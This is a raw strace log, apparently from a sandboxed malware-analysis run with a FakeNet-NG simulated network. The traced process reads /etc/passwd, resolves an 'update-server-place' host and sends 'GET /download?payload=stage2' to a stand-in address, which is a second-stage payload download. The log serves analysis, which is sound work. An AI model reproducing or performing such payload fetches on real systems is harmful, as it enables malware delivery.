24    10:07:56.373084 read(3</etc/ssl/openssl.cnf>, "#\n# OpenSSL example configuratio"..., 4096) = 4096
24    10:07:56.373566 read(3</etc/ssl/openssl.cnf>, "d attributes must be the same, a"..., 4096) = 4096
24    10:07:56.374072 read(3</etc/ssl/openssl.cnf>, "coding of an extension: beware e"..., 4096) = 4096
24    10:07:56.374520 read(3</etc/ssl/openssl.cnf>, " = $insta::certout # insta.cert."..., 4096) = 36
24    10:07:56.374974 read(3</etc/ssl/openssl.cnf>, "", 4096) = 0
24    10:07:56.375584 close(3</etc/ssl/openssl.cnf>) = 0
24    10:07:56.376163 futex(0x77bfe9a39bf8, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    10:07:56.376705 futex(0x77bfe9a39c54, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    10:07:56.377176 futex(0x77bfe9a3a394, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    10:07:56.377597 futex(0x77bfe9a39bd8, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    10:07:56.378036 futex(0x77bfe9a3a3b8, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    10:07:56.378452 futex(0x77bfe9ae6844, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    10:07:56.378894 futex(0x77bfe9ae6864, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    10:07:56.379402 openat(AT_FDCWD</sandbox>, "/home/analyst/.curlrc", O_RDONLY) = -1 ENOENT (No such file or directory)
24    10:07:56.379856 openat(AT_FDCWD</sandbox>, "/home/analyst/.config/curlrc", O_RDONLY) = -1 ENOENT (No such file or directory)
24    10:07:56.380357 geteuid()         = 1001
24    10:07:56.380785 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 3<socket:[54158]>
24    10:07:56.381226 connect(3<socket:[54158]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
24    10:07:56.381678 close(3<socket:[54158]>) = 0
24    10:07:56.382112 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 3<socket:[54159]>
24    10:07:56.382547 connect(3<socket:[54159]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
24    10:07:56.382979 close(3<socket:[54159]>) = 0
24    10:07:56.383663 newfstatat(AT_FDCWD</sandbox>, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=494, ...}, 0) = 0
24    10:07:56.384281 newfstatat(AT_FDCWD</sandbox>, "/", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
24    10:07:56.384857 openat(AT_FDCWD</sandbox>, "/etc/nsswitch.conf", O_RDONLY|O_CLOEXEC) = 3</etc/nsswitch.conf>
24    10:07:56.385393 fstat(3</etc/nsswitch.conf>, {st_mode=S_IFREG|0644, st_size=494, ...}) = 0
24    10:07:56.385807 read(3</etc/nsswitch.conf>, "# /etc/nsswitch.conf\n#\n# Example"..., 4096) = 494
24    10:07:56.386257 read(3</etc/nsswitch.conf>, "", 4096) = 0
24    10:07:56.386652 fstat(3</etc/nsswitch.conf>, {st_mode=S_IFREG|0644, st_size=494, ...}) = 0
24    10:07:56.387050 close(3</etc/nsswitch.conf>) = 0
24    10:07:56.387494 openat(AT_FDCWD</sandbox>, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 3</etc/passwd>
24    10:07:56.387915 fstat(3</etc/passwd>, {st_mode=S_IFREG|0644, st_size=1044, ...}) = 0
24    10:07:56.388466 lseek(3</etc/passwd>, 0, SEEK_SET) = 0
24    10:07:56.389008 read(3</etc/passwd>, "root:x:0:0:root:/root:/bin/bash\n"..., 4096) = 1044
24    10:07:56.389609 close(3</etc/passwd>) = 0
24    10:07:56.390034 openat(AT_FDCWD</sandbox>, "/home/analyst/.curlrc", O_RDONLY) = -1 ENOENT (No such file or directory)
24    10:07:56.390490 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, 8) = 0
24    10:07:56.390877 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, NULL, 8) = 0
24    10:07:56.391266 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, NULL, 8) = 0
24    10:07:56.391686 ioctl(1<pipe:[78065]>, TCGETS, 0x7ffe902030d0) = -1 ENOTTY (Inappropriate ioctl for device)
24    10:07:56.392257 ioctl(0<pipe:[79132]>, TIOCGWINSZ, 0x7ffe90203200) = -1 ENOTTY (Inappropriate ioctl for device)
24    10:07:56.392824 pipe2([3<pipe:[54160]>, 4<pipe:[54160]>], 0) = 0
24    10:07:56.393310 fcntl(3<pipe:[54160]>, F_GETFL) = 0 (flags O_RDONLY)
24    10:07:56.393835 fcntl(3<pipe:[54160]>, F_SETFL, O_RDONLY|O_NONBLOCK) = 0
24    10:07:56.394335 fcntl(4<pipe:[54160]>, F_GETFL) = 0x1 (flags O_WRONLY)
24    10:07:56.394836 fcntl(4<pipe:[54160]>, F_SETFL, O_WRONLY|O_NONBLOCK) = 0
24    10:07:56.395284 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, 8) = 0
24    10:07:56.395675 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, NULL, 8) = 0
24    10:07:56.396074 poll([{fd=3<pipe:[54160]>, events=POLLIN}], 1, 0) = 0 (Timeout)
24    10:07:56.396514 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, 8) = 0
24    10:07:56.396895 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, NULL, 8) = 0
24    10:07:56.397280 brk(0x5ef71bfef000) = 0x5ef71bfef000
24    10:07:56.397689 socket(AF_INET6, SOCK_DGRAM, IPPROTO_IP) = 5<socket:[54161]>
24    10:07:56.398201 close(5<socket:[54161]>) = 0
24    10:07:56.398614 pipe2([5<pipe:[54162]>, 6<pipe:[54162]>], 0) = 0
24    10:07:56.399031 rt_sigaction(SIGRT_1, {sa_handler=0x77bfe9c73610, sa_mask=[], sa_flags=SA_RESTORER|SA_ONSTACK|SA_RESTART|SA_SIGINFO, sa_restorer=0x77bfe9c1f330}, NULL, 8) = 0
24    10:07:56.399415 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
24    10:07:56.399801 mmap(NULL, 8392704, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0) = 0x77bfe83a2000
24    10:07:56.400310 mprotect(0x77bfe83a3000, 8388608, PROT_READ|PROT_WRITE) = 0
24    10:07:56.401014 rt_sigprocmask(SIG_BLOCK, ~[], [], 8) = 0
24    10:07:56.401526 clone3({flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, child_tid=0x77bfe8ba2990, parent_tid=0x77bfe8ba2990, exit_signal=0, stack=0x77bfe83a2000, stack_size=0x7ffd80, tls=0x77bfe8ba26c0}, 88) = -1 ENOSYS (Function not implemented)
24    10:07:56.401929 clone(child_stack=0x77bfe8ba1d70, flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, parent_tid=[25], tls=0x77bfe8ba26c0, child_tidptr=0x77bfe8ba2990) = 25
25    10:07:56.402538 rseq(0x77bfe8ba2fe0, 0x20, 0, 0x53053053 <unfinished ...>
24    10:07:56.402723 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
25    10:07:56.402888 <... rseq resumed>) = 0
24    10:07:56.403057 <... rt_sigprocmask resumed>NULL, 8) = 0
25    10:07:56.403229 set_robust_list(0x77bfe8ba29a0, 24 <unfinished ...>
24    10:07:56.403402 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330},  <unfinished ...>
25    10:07:56.403576 <... set_robust_list resumed>) = 0
24    10:07:56.403753 <... rt_sigaction resumed>NULL, 8) = 0
25    10:07:56.403912 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
24    10:07:56.404146 poll([{fd=5<pipe:[54162]>, events=POLLIN}, {fd=3<pipe:[54160]>, events=POLLIN}], 2, 1 <unfinished ...>
25    10:07:56.404383 <... rt_sigprocmask resumed>NULL, 8) = 0
25    10:07:56.404608 mmap(NULL, 134217728, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x77bfe03a2000
25    10:07:56.405164 munmap(0x77bfe03a2000, 63299584) = 0
24    10:07:56.405596 <... poll resumed>) = 0 (Timeout)
25    10:07:56.405781 munmap(0x77bfe8000000, 3809280 <unfinished ...>
24    10:07:56.405961 rt_sigaction(SIGPIPE, NULL,  <unfinished ...>
25    10:07:56.406189 <... munmap resumed>) = 0
24    10:07:56.406412 <... rt_sigaction resumed>{sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, 8) = 0
25    10:07:56.406653 mprotect(0x77bfe4000000, 135168, PROT_READ|PROT_WRITE <unfinished ...>
24    10:07:56.406839 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330},  <unfinished ...>
25    10:07:56.407014 <... mprotect resumed>) = 0
24    10:07:56.407172 <... rt_sigaction resumed>NULL, 8) = 0
25    10:07:56.407359 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0 <unfinished ...>
24    10:07:56.407524 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330},  <unfinished ...>
25    10:07:56.407727 <... socket resumed>) = 7<socket:[76146]>
24    10:07:56.407932 <... rt_sigaction resumed>NULL, 8) = 0
25    10:07:56.408096 connect(7<socket:[76146]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110 <unfinished ...>
24    10:07:56.408427 poll([{fd=5<pipe:[54162]>, events=POLLIN}, {fd=3<pipe:[54160]>, events=POLLIN}], 2, 2 <unfinished ...>
25    10:07:56.408718 <... connect resumed>) = -1 ENOENT (No such file or directory)
25    10:07:56.408986 close(7<socket:[76146]>) = 0
25    10:07:56.409446 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 7<socket:[76147]>
25    10:07:56.410116 connect(7<socket:[76147]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
25    10:07:56.410581 close(7<socket:[76147]>) = 0
24    10:07:56.410998 <... poll resumed>) = 0 (Timeout)
25    10:07:56.411168 newfstatat(AT_FDCWD</sandbox>, "/etc/nsswitch.conf",  <unfinished ...>
24    10:07:56.411384 rt_sigaction(SIGPIPE, NULL,  <unfinished ...>
25    10:07:56.411553 <... newfstatat resumed>{st_mode=S_IFREG|0644, st_size=494, ...}, 0) = 0
24    10:07:56.411725 <... rt_sigaction resumed>{sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, 8) = 0
25    10:07:56.411898 newfstatat(AT_FDCWD</sandbox>, "/etc/resolv.conf",  <unfinished ...>
24    10:07:56.412091 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330},  <unfinished ...>
25    10:07:56.412291 <... newfstatat resumed>{st_mode=S_IFREG|0644, st_size=22, ...}, 0) = 0
24    10:07:56.412463 <... rt_sigaction resumed>NULL, 8) = 0
25    10:07:56.412629 openat(AT_FDCWD</sandbox>, "/etc/host.conf", O_RDONLY|O_CLOEXEC <unfinished ...>
24    10:07:56.412813 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330},  <unfinished ...>
25    10:07:56.412990 <... openat resumed>) = 7</etc/host.conf>
24    10:07:56.413167 <... rt_sigaction resumed>NULL, 8) = 0
25    10:07:56.413336 fstat(7</etc/host.conf>,  <unfinished ...>
24    10:07:56.413510 poll([{fd=5<pipe:[54162]>, events=POLLIN}, {fd=3<pipe:[54160]>, events=POLLIN}], 2, 4 <unfinished ...>
25    10:07:56.413712 <... fstat resumed>{st_mode=S_IFREG|0644, st_size=92, ...}) = 0
25    10:07:56.413953 read(7</etc/host.conf>, "# The \"order\" line is only used "..., 4096) = 92
25    10:07:56.414368 read(7</etc/host.conf>, "", 4096) = 0
25    10:07:56.414788 close(7</etc/host.conf>) = 0
25    10:07:56.415262 futex(0x77bfe9de566c, FUTEX_WAKE_PRIVATE, 2147483647) = 0
25    10:07:56.415815 openat(AT_FDCWD</sandbox>, "/etc/resolv.conf", O_RDONLY|O_CLOEXEC) = 7</etc/resolv.conf>
25    10:07:56.416427 fstat(7</etc/resolv.conf>, {st_mode=S_IFREG|0644, st_size=22, ...}) = 0
25    10:07:56.416910 read(7</etc/resolv.conf>, "nameserver 172.19.0.2\n", 4096) = 22
25    10:07:56.417555 read(7</etc/resolv.conf>, "", 4096) = 0
24    10:07:56.418028 <... poll resumed>) = 0 (Timeout)
25    10:07:56.418197 uname( <unfinished ...>
24    10:07:56.418363 rt_sigaction(SIGPIPE, NULL,  <unfinished ...>
25    10:07:56.418532 <... uname resumed>{sysname="Linux", nodename="fc1e21eea59f", ...}) = 0
24    10:07:56.418710 <... rt_sigaction resumed>{sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, 8) = 0
25    10:07:56.418891 fstat(7</etc/resolv.conf>,  <unfinished ...>
24    10:07:56.419063 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330},  <unfinished ...>
25    10:07:56.419231 <... fstat resumed>{st_mode=S_IFREG|0644, st_size=22, ...}) = 0
24    10:07:56.419400 <... rt_sigaction resumed>NULL, 8) = 0
25    10:07:56.419564 close(7</etc/resolv.conf> <unfinished ...>
24    10:07:56.419739 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330},  <unfinished ...>
25    10:07:56.419904 <... close resumed>) = 0
24    10:07:56.420093 <... rt_sigaction resumed>NULL, 8) = 0
25    10:07:56.420306 openat(AT_FDCWD</sandbox>, "/etc/hosts", O_RDONLY|O_CLOEXEC <unfinished ...>
24    10:07:56.420505 poll([{fd=5<pipe:[54162]>, events=POLLIN}, {fd=3<pipe:[54160]>, events=POLLIN}], 2, 8 <unfinished ...>
25    10:07:56.420707 <... openat resumed>) = 7</etc/hosts>
25    10:07:56.420910 fstat(7</etc/hosts>, {st_mode=S_IFREG|0644, st_size=172, ...}) = 0
25    10:07:56.421305 lseek(7</etc/hosts>, 0, SEEK_SET) = 0
25    10:07:56.421690 read(7</etc/hosts>, "127.0.0.1\tlocalhost\n::1\tlocalhos"..., 4096) = 172
25    10:07:56.422082 read(7</etc/hosts>, "", 4096) = 0
25    10:07:56.422464 close(7</etc/hosts>) = 0
25    10:07:56.422854 socket(AF_INET, SOCK_DGRAM|SOCK_CLOEXEC|SOCK_NONBLOCK, IPPROTO_IP) = 7<socket:[76148]>
25    10:07:56.423358 setsockopt(7<socket:[76148]>, SOL_IP, IP_RECVERR, [1], 4) = 0
25    10:07:56.423744 connect(7<socket:[76148]>, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("172.19.0.2")}, 16) = 0
25    10:07:56.424227 poll([{fd=7<socket:[76148]>, events=POLLOUT}], 1, 0) = 1 ([{fd=7, revents=POLLOUT}])
25    10:07:56.424655 sendmmsg(7<socket:[76148]>, [{msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="U\7\1\0\0\1\0\0\0\0\0\0\31update-server-place"..., iov_len=49}], msg_iovlen=1, msg_controllen=0, msg_flags=0}, msg_len=49}, {msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="\327\6\1\0\0\1\0\0\0\0\0\0\31update-server-place"..., iov_len=49}], msg_iovlen=1, msg_controllen=0, msg_flags=0}, msg_len=49}], 2, MSG_NOSIGNAL) = 2
25    10:07:56.425368 poll([{fd=7<socket:[76148]>, events=POLLIN}], 1, 5000 <unfinished ...>
24    10:07:56.428879 <... poll resumed>) = 0 (Timeout)
24    10:07:56.429269 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, 8) = 0
24    10:07:56.429850 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, NULL, 8) = 0
24    10:07:56.430426 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, NULL, 8) = 0
24    10:07:56.431036 poll([{fd=5<pipe:[54162]>, events=POLLIN}, {fd=3<pipe:[54160]>, events=POLLIN}], 2, 16 <unfinished ...>
25    10:07:56.433052 <... poll resumed>) = 1 ([{fd=7, revents=POLLIN}])
25    10:07:56.433369 ioctl(7<socket:[76148]>, FIONREAD, [65]) = 0
25    10:07:56.433909 recvfrom(7<socket:[76148]>, "U\7\205\200\0\1\0\1\0\0\0\0\31update-server-place"..., 2048, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("172.19.0.2")}, [28 => 16]) = 65
25    10:07:56.440758 poll([{fd=7<socket:[76148]>, events=POLLIN}], 1, 4983) = 1 ([{fd=7, revents=POLLIN}])
25    10:07:56.444865 ioctl(7<socket:[76148]>, FIONREAD, [49]) = 0
25    10:07:56.447281 recvfrom(7<socket:[76148]>,  <unfinished ...>
24    10:07:56.448034 <... poll resumed>) = 0 (Timeout)
25    10:07:56.448710 <... recvfrom resumed>"\327\6\205\200\0\1\0\0\0\0\0\0\31update-server-place"..., 65536, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("172.19.0.2")}, [28 => 16]) = 49
24    10:07:56.449239 rt_sigaction(SIGPIPE, NULL,  <unfinished ...>
25    10:07:56.449723 close(7<socket:[76148]> <unfinished ...>
24    10:07:56.450309 <... rt_sigaction resumed>{sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, 8) = 0
25    10:07:56.450877 <... close resumed>) = 0
24    10:07:56.451321 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330},  <unfinished ...>
25    10:07:56.451764 write(6<pipe:[54162]>, "\1", 1 <unfinished ...>
24    10:07:56.452278 <... rt_sigaction resumed>NULL, 8) = 0
25    10:07:56.452633 <... write resumed>) = 1
24    10:07:56.452986 futex(0x5ef71bfb0ac0, FUTEX_WAIT_PRIVATE, 2, NULL <unfinished ...>
25    10:07:56.453331 futex(0x5ef71bfb0ac0, FUTEX_WAKE_PRIVATE, 1 <unfinished ...>
24    10:07:56.453662 <... futex resumed>) = -1 EAGAIN (Resource temporarily unavailable)
25    10:07:56.453977 <... futex resumed>) = 0
24    10:07:56.454282 futex(0x5ef71bfb0ac0, FUTEX_WAKE_PRIVATE, 1 <unfinished ...>
25    10:07:56.454593 rt_sigprocmask(SIG_BLOCK, ~[RT_1],  <unfinished ...>
24    10:07:56.454886 <... futex resumed>) = 0
25    10:07:56.455181 <... rt_sigprocmask resumed>NULL, 8) = 0
24    10:07:56.455462 futex(0x77bfe8ba2990, FUTEX_WAIT_BITSET|FUTEX_CLOCK_REALTIME, 25, NULL, FUTEX_BITSET_MATCH_ANY <unfinished ...>
25    10:07:56.455749 madvise(0x77bfe83a2000, 8368128, MADV_DONTNEED) = 0
25    10:07:56.456536 exit(0)           = ?
25    10:07:56.457280 +++ exited with 0 +++
24    10:07:56.457589 <... futex resumed>) = 0
24    10:07:56.457896 close(6<pipe:[54162]>) = 0
24    10:07:56.458622 close(5<pipe:[54162]>) = 0
24    10:07:56.459278 socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 5<socket:[54163]>
24    10:07:56.459875 setsockopt(5<socket:[54163]>, SOL_TCP, TCP_NODELAY, [1], 4) = 0
24    10:07:56.460471 setsockopt(5<socket:[54163]>, SOL_SOCKET, SO_KEEPALIVE, [1], 4) = 0
24    10:07:56.461057 setsockopt(5<socket:[54163]>, SOL_TCP, TCP_KEEPIDLE, [60], 4) = 0
24    10:07:56.461621 setsockopt(5<socket:[54163]>, SOL_TCP, TCP_KEEPINTVL, [60], 4) = 0
24    10:07:56.462183 fcntl(5<socket:[54163]>, F_GETFL) = 0x2 (flags O_RDWR)
24    10:07:56.462673 fcntl(5<socket:[54163]>, F_SETFL, O_RDWR|O_NONBLOCK) = 0
24    10:07:56.463227 connect(5<socket:[54163]>, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("192.0.2.123")}, 16) = -1 EINPROGRESS (Operation now in progress)
24    10:07:56.463960 getsockname(5<socket:[54163]>, {sa_family=AF_INET, sin_port=htons(41214), sin_addr=inet_addr("172.19.0.2")}, [128 => 16]) = 0
24    10:07:56.464567 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, NULL, 8) = 0
24    10:07:56.465126 poll([{fd=5<socket:[54163]>, events=POLLOUT}, {fd=3<pipe:[54160]>, events=POLLIN}], 2, 45) = 1 ([{fd=5, revents=POLLOUT}])
24    10:07:56.471020 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, 8) = 0
24    10:07:56.471657 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, NULL, 8) = 0
24    10:07:56.472262 poll([{fd=5<socket:[54163]>, events=POLLPRI|POLLOUT|POLLWRNORM}], 1, 0) = 1 ([{fd=5, revents=POLLOUT|POLLWRNORM}])
24    10:07:56.472833 getsockopt(5<socket:[54163]>, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
24    10:07:56.473366 getsockname(5<socket:[54163]>, {sa_family=AF_INET, sin_port=htons(41214), sin_addr=inet_addr("172.19.0.2")}, [128 => 16]) = 0
24    10:07:56.473902 getpeername(5<socket:[54163]>, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("192.0.2.123")}, [128 => 16]) = 0
24    10:07:56.474470 getsockname(5<socket:[54163]>, {sa_family=AF_INET, sin_port=htons(41214), sin_addr=inet_addr("172.19.0.2")}, [128 => 16]) = 0
24    10:07:56.475025 getpeername(5<socket:[54163]>, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("192.0.2.123")}, [128 => 16]) = 0
24    10:07:56.475559 getsockname(5<socket:[54163]>, {sa_family=AF_INET, sin_port=htons(41214), sin_addr=inet_addr("172.19.0.2")}, [128 => 16]) = 0
24    10:07:56.476124 sendto(5<socket:[54163]>, "GET /download?payload=stage2 HTT"..., 167, MSG_NOSIGNAL, NULL, 0) = 167
24    10:07:56.476721 poll([{fd=5<socket:[54163]>, events=POLLIN|POLLPRI|POLLRDNORM|POLLRDBAND}], 1, 0) = 0 (Timeout)
24    10:07:56.477262 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, NULL, 8) = 0
24    10:07:56.477783 poll([{fd=5<socket:[54163]>, events=POLLIN}, {fd=3<pipe:[54160]>, events=POLLIN}], 2, 32) = 1 ([{fd=5, revents=POLLIN}])
24    10:07:56.500613 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, 8) = 0
24    10:07:56.503787 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, NULL, 8) = 0
24    10:07:56.504600 poll([{fd=5<socket:[54163]>, events=POLLIN|POLLPRI|POLLRDNORM|POLLRDBAND}], 1, 0) = 1 ([{fd=5, revents=POLLIN|POLLRDNORM}])
24    10:07:56.505423 recvfrom(5<socket:[54163]>, "HTTP/1.0 200 OK\r\nServer: FakeNet"..., 102400, 0, NULL, NULL) = 124
24    10:07:56.506230 poll([{fd=5<socket:[54163]>, events=POLLIN|POLLPRI|POLLRDNORM|POLLRDBAND}], 1, 0) = 1 ([{fd=5, revents=POLLIN|POLLRDNORM}])
24    10:07:56.507433 recvfrom(5<socket:[54163]>, "<html>\n<head>\n<title>FakeNet-NG<"..., 1411, 0, NULL, NULL) = 1411
24    10:07:56.508612 fstat(1<pipe:[78065]>, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
24    10:07:56.511889 close(5<socket:[54163]>) = 0
24    10:07:56.519177 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, NULL, 8) = 0
24    10:07:56.520931 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, NULL, 8) = 0
24    10:07:56.522160 write(1<pipe:[78065]>, "<html>\n<head>\n<title>FakeNet-NG<"..., 1411) = 1411
24    10:07:56.523377 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, 8) = 0
24    10:07:56.524567 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, NULL, 8) = 0
24    10:07:56.525685 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, 8) = 0
24    10:07:56.526576 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, NULL, 8) = 0
24    10:07:56.527454 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, NULL, 8) = 0
24    10:07:56.528219 close(3<pipe:[54160]>) = 0
24    10:07:56.528915 close(4<pipe:[54160]>) = 0
24    10:07:56.529576 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, NULL, 8) = 0
24    10:07:56.530119 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, 8) = 0
24    10:07:56.530732 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, NULL, 8) = 0
24    10:07:56.531388 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, NULL, 8) = 0
24    10:07:56.532090 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, 8) = 0
24    10:07:56.532703 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, NULL, 8) = 0
